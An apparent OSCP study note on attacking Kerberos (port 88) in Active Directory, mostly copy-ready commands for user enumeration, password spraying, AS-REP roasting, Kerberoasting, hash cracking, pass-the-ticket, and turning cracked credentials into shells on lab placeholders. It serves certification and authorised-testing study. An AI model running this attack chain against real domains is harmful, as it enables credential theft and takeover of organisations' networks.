# 🔧 Kerberos — Port 88

> **Active Directory authentication protocol.** Port 88 open = **this is a Domain Controller** (the KDC) or a domain member serving auth. Ticket-based: clients get a **TGT** from the KDC, then request **TGS** tickets for services (identified by **SPN**); **pre-auth** is normally required — if disabled, an account is AS-REP roastable. On OSCP, Kerberos is where usernames turn into crackable hashes: **AS-REP roasting** (no creds needed) and **Kerberoasting** (one cred needed). It's the engine behind the AD kill chain.

Related: [[Active Directory]] · [[LDAP]] · [[SMB]] · [[RPC]] · [[Credential Attacks]]

---

## 🧠 PORT 88 → THINK
- **88 open = Domain Controller.** Treat the whole box as AD.
- **No creds?** → **AS-REP roast** any user with pre-auth disabled.
- **One cred?** → **Kerberoast** every service account (SPN).
- Need a **userlist** first → get it from [[LDAP]] / [[RPC]].
- **Clock skew kills Kerberos** — sync your time to the DC (`ntpdate`/`rdate`) or get `KRB_AP_ERR_SKEW`.
- Know the **domain FQDN** and put the DC in `/etc/hosts`.

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
nmap -p88 -sV $IP                                  # confirms Kerberos + often domain/DC
```

```bash
# Enumerate valid users WITHOUT creds (kerbrute)
kerbrute userenum -d corp.local --dc $IP users.txt
```
**Verdict:** valid users found → AS-REP roast them. Got a cred already → Kerberoast. No userlist → go build one via LDAP/RPC.

## ⏱️ ENUMERATE
```bash
export DOMAIN=corp.local
```

```bash
# Sync clock FIRST or every Kerberos command errors
sudo ntpdate $IP    # or: sudo rdate -n $IP
```

```bash
# Valid-user enumeration (no creds) — differential KDC error codes (valid-but-wrong-pw vs unknown user)
kerbrute userenum -d $DOMAIN --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

```bash
kerbrute passwordspray -d $DOMAIN --dc $IP users.txt 'Season2024!'   # spray — mind lockout (getdompwinfo via RPC)!
```

```bash
# AS-REP roast (no creds) — users with DONT_REQ_PREAUTH
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP -format hashcat -outputfile asrep.txt
```

```bash
# Kerberoast (needs ONE valid cred) — all SPN service accounts
impacket-GetUserSPNs $DOMAIN/jdoe:'Password1' -dc-ip $IP -request -outputfile kerb.txt
```

```bash
netexec ldap $IP -u jdoe -p Password1 --kerberoasting kerb.txt
```

```bash
netexec ldap $IP -u '' -p '' --asreproast asrep.txt      # sometimes works null
```

```bash
# Crack whatever you got
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt   # AS-REP
```

```bash
hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt   # Kerberoast (TGS)
```
**Look for:** valid usernames (kerbrute `VALID USERNAME`), `$krb5asrep$` / `$krb5tgs$` hashes → crack offline → a valid domain credential → shell via [[WinRM]] / [[SMB]]. Build/refine `users.txt` from [[LDAP]] and [[RPC]].

**Tickets (pass-the-ticket):**
```bash
impacket-getTGT $DOMAIN/jdoe:'Password1' -dc-ip $IP        # produces a .ccache
```

```bash
export KRB5CCNAME=jdoe.ccache
```

```bash
netexec smb $IP -k --use-kcache
```

```bash
impacket-psexec -k -no-pass $DOMAIN/jdoe@dc.corp.local
```

## 🗡️ EXPLOIT
- 🟢 **AS-REP roasting** (no creds) → crack `$krb5asrep$` (hashcat `-m 18200`).
- 🟢 **Kerberoasting** (one cred) → crack `$krb5tgs$` (hashcat `-m 13100`).
- 🟢 **Kerbrute user enum** → userlist for spray/roast.
- 🟡 **Password spraying** via kerbrute/netexec (after reading lockout policy!).
- 🔵 **Pass-the-ticket** after obtaining a TGT/TGS.
- 🔵 **Delegation / golden-silver tickets** — advanced, rarely core OSCP; see [[Active Directory]].

```bash
# 1) No creds: enumerate + AS-REP roast
kerbrute userenum -d $DOMAIN --dc $IP users.txt
```

```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP -format hashcat -o asrep.txt
```

```bash
hashcat -m 18200 asrep.txt rockyou.txt
```

```bash
# 2) One cred: Kerberoast
impacket-GetUserSPNs $DOMAIN/jdoe:'Password1' -dc-ip $IP -request -o kerb.txt
```

```bash
hashcat -m 13100 kerb.txt rockyou.txt
# 3) Cracked cred -> shell
```

```bash
evil-winrm -i $IP -u svc_sql -p 'Cracked!'      # if in Remote Mgmt Users
```

```bash
netexec smb $IP -u svc_sql -p 'Cracked!'         # confirm; (Pwn3d!)=admin
```
**After access:** valid domain credential → interactive shell → run BloodHound (`bloodhound-python -c all -u user -p pass -d corp.local -ns $IP`), map to Domain Admin, re-Kerberoast with the new account, hunt delegation → [[Windows Privilege Escalation]] / [[Active Directory]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| Port 88 open | It's a DC | treat as AD; enum LDAP/RPC | userlist |
| kerbrute VALID user | Real account | AS-REP roast it | maybe hash |
| `$krb5asrep$` hash | Pre-auth disabled | `hashcat -m 18200` | password |
| `$krb5tgs$` hash | Kerberoastable SPN | `hashcat -m 13100` | password |
| Cracked service cred | Domain foothold | evil-winrm / netexec | shell |
| `KRB_AP_ERR_SKEW` | Clock off | `ntpdate $IP` | retry works |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `KRB_AP_ERR_SKEW` | `sudo ntpdate $IP` (or `rdate -n $IP`); Kerberos needs <5 min skew |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Username/domain wrong — fix case/FQDN; add DC to `/etc/hosts` |
| No AS-REP hashes | No pre-auth-disabled users → need a cred → Kerberoast instead |
| No userlist | Build one via [[LDAP]] anonymous / [[RPC]] RID-brute |
| GetNPUsers returns nothing | Try `netexec ldap --asreproast`; verify domain FQDN |
| Hash won't crack | Bigger wordlist / rules; move on and get creds another way |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** **not syncing the clock** (every Kerberos command fails cryptically) · using an **IP instead of the domain FQDN** / not putting the DC in `/etc/hosts` · **spraying before checking lockout** (`getdompwinfo` via [[RPC]]) · confusing hashcat modes (**18200 = AS-REP**, **13100 = Kerberoast/TGS**) · forgetting AS-REP roasting needs **no credentials** — always try it early.
**Reuse:** cracked creds → [[WinRM]], [[SMB]], [[RDP]], [[MSSQL]], [[LDAP]]; userlists flow in from LDAP/RPC, hashes flow out to [[Credential Attacks]]. Kerberos is the middle of the AD triad — see [[Active Directory]].
**Don't miss:** **sync clock** to DC before anything · add domain + DC to `/etc/hosts` · `kerbrute userenum` to validate users · **AS-REP roast** (no creds) — always try · **Kerberoast** once you have any cred · correct hashcat modes (18200 / 13100) · reuse any cracked cred everywhere.
**Stop when:** no AS-REP users, no cred to Kerberoast, and no way to build a userlist → exhausted for now; find a credential via other services and return. Once you crack a hash, work shifts to a shell + [[Active Directory]] escalation.

## 📇 CHEAT SHEET
```bash
sudo ntpdate $IP                                                   # fix clock first
```

```bash
kerbrute userenum -d corp.local --dc $IP users.txt                # valid users
```

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip $IP -format hashcat -o asrep.txt
```

```bash
impacket-GetUserSPNs corp.local/jdoe:'Pass' -dc-ip $IP -request -o kerb.txt
```

```bash
hashcat -m 18200 asrep.txt rockyou.txt        # AS-REP
```

```bash
hashcat -m 13100 kerb.txt  rockyou.txt        # Kerberoast
```

```bash
evil-winrm -i $IP -u <svc> -p '<cracked>'     # cash out
```
**Kill shots:** AS-REP roast (no creds) → crack → shell · Kerberoast (1 cred) → crack → shell.
